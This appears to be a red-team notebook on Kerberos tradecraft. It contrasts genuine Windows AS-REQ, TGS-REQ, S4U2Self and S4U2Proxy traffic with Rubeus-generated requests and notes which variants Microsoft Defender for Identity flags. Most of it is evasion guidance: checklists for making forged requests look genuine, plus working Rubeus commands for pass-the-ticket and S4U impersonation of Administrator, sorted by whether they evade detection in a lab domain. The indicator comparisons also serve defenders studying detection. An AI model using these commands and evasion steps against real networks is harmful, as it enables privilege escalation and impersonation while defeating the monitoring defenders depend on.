# OPSEC AS-REQ
- Genuine AS REQ’s always first send an AS REQ without pre authentication. 
- Then, If the account requires pre authentication, a second AS REQ is sent
![](imgachments/ASREQGenuine.png)
- Rubeus does not send the first AS REQ without pre authentication
![](imgachments/ASREQRubeus.png)
- Encryption Type
	- The encryption type used to encrypt most encrypted sections of genuine Kerberos messages is AES256 (18)
	- Rubeus, kekeo and impacket all support multiple encryption types but are often used with RC4 (23)
	- This is the easiest indicator that one of these tools is likely in use
- Rubeus AS-Req:
![](imgachments/ASREQRubeus1.png)
- Geniune AS-Req:
![](imgachments/ASREQGenuine1.png)
- Rubeus AS REQ Indicators:
	- KDC options differ from real traffic with canonicalize disabled
	- Incorrect supported etypes specified, genuine AS REQ’s includes 6 supported etypes
	- Missing rtime (renew time) field
	- Missing addresses field
![](imgachments/ASREQGenuineVsRubeus.png)
- Using Rubeus, the canonicalize bit is disabled
![imgachments/CanonicalizeFalse.png](imgachments/CanonicalizeFalse.png)
- Tools vs genuine AS-Req comparaison
![](imgachments/ASREQGenuineVsRubeus1.png)

## MDI alert

![](imgachments/Pasted%20image%2020260416100707.png)


![](imgachments/Pasted%20image%2020260416162925.png)


## Emulate genuine AS-REQ
- For genuine AS-Req to get a TGT:
	- Send first an AS-REQ without pre authentication, then a second AS-REQ with the `PA-ENC-TIMESTAMP, PA-DATA` section encrypted with the account secret.
	- Use AES256 as the encryption type for the encrypted sections (not RC4)
	- Make sure that canonicalize is enabled in KDC options
	- Make sure that AS REQ includes the 6 supported etypes (not just one)
	- Make sure that AS REQ has the rtime field as well as the addresses field
```bash
# Opsec friendly 
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe asktgt /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:mhd /aes256:05B2FCE16C6564D6A8XXXX7C72D5090D9CC3F66FC4F5E376FD8EBB76B8D0 /enctype:aes256 /opsec /nowrap /ptt

# Less opsec, MDI may detect it! (undected in the lab)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe asktgt /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:mhd /rc4:F894F8DBEXXXX0421B73202F4A5160D /enctype:aes256 /opsec /nowrap /ptt /force

# Detected by MDI
Rubeus.exe asktgt /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:mhd /rc4:F894F8DBE06XXXXX73202F4A5160D
Rubeus.exe asktgt /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:mhd /aes256:05B2FCE16C6564D6A8XXXXXXC72D5090D9CC3F66FC4F5E376FD8EBB76B8D0
```
# OPSEC TGS-REQ
- Several service tickets are requested following a genuine login: host, ldap, cifs.
![919](imgachments/SeveralTGSReq.png)

Rubeus TGS-Req indicators :
- PA DATA does not include the PA PAC OPTIONS field
- KDC options differ from real traffic with canonicalize disabled
- Incorrect supported etypes specified, genuine TGS REQ’s includes 5 supported etypes
- cname field included when not in genuine traffic
- unproper till field
- Missing enc authorization data field
![](imgachments/TGSREQGenuineVsRubeus.png)
- MDI alert
![](imgachments/Pasted%20image%2020260416172342.png)
- For the Authenticator (cksum, cusec, seq number): Unlikely to be monitored for as decrypting all authenticators on the fly would be a massive overhead.
![](imgachments/AuthenticatorGenuinsVsRubeus.png)
- Genuine TGS Req vs Tools TGS Req
![](imgachments/TGSREQGenuineVsTools.png) 

When asking for a TGS for a service with unconstrained delegation
- TGS REP (replies to TGS REQ) will set the "ok as delegate" bit within the flags field of the enc-part section if the account with the SPN is configured for unconstrained delegation
![](imgachments/TGSRepUnc.png)
- This results in a second TGS REQ for "krbtgt/domain.com" being requested to get a forwardable TGT and include it in the connection to the service
![](imgachments/TGS-REQForForwardable.png)
- Therefore, when asking for TGS for a service that has unconstrained delegation, to be as genuine as possible, we need to also issue a TGS REQ for "krbtgt/domain.com" to get a forwardable TGT to include it in the connection to that service.
![](imgachments/OPSECUnconstrainedDelegationRubeus.png)
## Emulate genuine TGS-REQ
- For genuine TGS-Req to get a TGS:
	- Use AES256 as the encryption type for the encrypted sections (not RC4)
	- Make sure to include the PA PAC OPTIONS field
	- Make sure that canonicalize is enabled in KDC options
	- Make sure to include the 5 supported etypes (not just 4)
	- Don't include the cname field
	- Make sure to have a proper till field
	- Make sure to include the enc-authorization-data field
	- Make sure to have a genuine authenticator section (cksum, cusec, seq number) even though it is unlikely to be monitored for, as decrypting all authenticators on the fly would be a massive overhead.
	- Several service tickets are requested following a genuine login (ldap, host, cifs,...)
```bash
# Opsec friendly
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe asktgs /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:Administrator /enctype:aes256 /opsec /service:ldap/dc01.yhp0w.lan,host/dc01.yhp0w.lan,cifs/dc01.yhp0w.lan /nowrap /ptt /ticket:doIFcjCCBW6gAwIBBaEDAgEWooIEYz.............................xPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNTRVZFTktJTkdET01

# Detected by MDI
Rubeus.exe asktgs /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:mhd /service:ldap/dc01.yhp0w.lan,http/dc01.yhp0w.lan,host/dc01.yhp0w.lan,cifs/dc01.yhp0w.lan /nowrap /ticket: doIFcjCCBW6gAwIBBaEDAgEWooIEYz.............................xPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNTRVZFTktJTkdET01

# opsec one shot as-req and tgs-req(x3)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe asktgs /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:mhd /aes256:05B2FCE16C6564D6A8B07B6EC67C72XXXXXXXXXXF5E376FD8EBB76B8D0 /enctype:aes256 /opsec /service:ldap/dc01.yhp0w.lan,host/dc01.yhp0w.lan,cifs/dc01.yhp0w.lan /nowrap /ptt

# TGT Renew
# Opsec TGT renew: based on a TGT from an opsec AS-Req
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe renew /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:mhd /enctype:aes256 /nowrap /ptt /ticket:........
```
# OPSEC S4U2SELF
- Difference between genuine and rubeus s4u2self Requests
![](imgachments/Pasted%20image%2020260127114724.png)
- Difference between genuine and tools s4u2self requests.
![](imgachments/Pasted%20image%2020260122101841.png)
## Emulate genuine S4U2Self TGS-REQ
- For genuine S4U2Self TGS-REQ:
	- Make sure to include the PA-S4U-X509-USER
	- Make sure that canonicalize is enabled in KDC options
	- Make sure to include the 5 supported etypes (not just 4)
	- Don't include the cname field
	- Make sure to have a proper till field (+15mn not till Sept 2037)
	- Make sure to have the proper PA USER name-type (Entreprise-PRINCIPAL not NT Principal)
	- Make sure to have the proper sname name-type (NT Principal)
	- Make sure to have a genuine authenticator section (cksum, cusec, seq number) even though it is unlikely to be monitored for, as decrypting all authenticators on the fly would be a massive overhead.
```bash
# Opsec friendly
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe s4u /self /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:svc_mhd /aes256:05B2FCE16C6564D6A8B07BXXXXXXXX3F66FC4F5E376FD8EBB76B8D0 /impersonateuser:Administrator /altservice:svc/srv01.yhp0w.lan /enctype:aes256 /opsec /nowrap /ptt

# Less opsec, MDI may detect it! (undetected in the lab) 
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe s4u /self /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:svc_mhd /rc4:F894F8DBE0XXXXXX3202F4A5160D /impersonateuser:Administrator /altservice:svc/srv01.yhp0w.lan /enctype:aes256 /opsec /nowrap /ptt
```
![](imgachments/Pasted%20image%2020260420170711.png)

# OPSEC S4U2PROXY
- Difference between genuine and rubeus s4u2proxy Requests
![](imgachments/GenuineVsRubeusS4u2proxy.png)
- Difference between genuine and tools s4u2proxy Requests
![](imgachments/GenuineVsToolsS4u2proxy.png)
## Emulate genuine S4U2Proxy TGS-REQ
- For genuine S4U2Proxy TGS-REQ (KCD):
	- Make sure to include the PA-PAC-OPTIONS
	- Make sure that canonicalize is enabled in KDC options
	- Make sure to include the 5 supported etypes (not just 4)
	- Don't include the cname field
	- Make sure to have a proper till field (+15mn not till Sept 2037)
	- Make sure to have the enc-authorization-date section 
	- Make sure to have a genuine authenticator section (cksum, cusec, seq number) even though it is unlikely to be monitored for, as decrypting all authenticators on the fly would be a massive overhead.
```bash
# Opsec friendly 
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe s4u /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:svc_mhd /aes256:05B2FCE16C6564D6A8BXXXXXXXXXXXXXC3F66FC4F5E376FD8EBB76B8D0 /impersonateuser:Administrator /msdsspn:svc2/srv01.yhp0w.lan /enctype:aes256 /opsec /nowrap /ptt

# Less opsec, MDI may detect it! (undetected in the lab)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe s4u /domain:yhp0w.lan /dc:dc01.yhp0w.lan /user:svc_mhd /rc4:F894F8DBE06D4XXXXXXX202F4A5160D /impersonateuser:Administrator /msdsspn:svc2/srv01.yhp0w.lan /enctype:aes256 /opsec /nowrap /ptt
```

![](imgachments/Pasted%20image%2020260420170808.png)
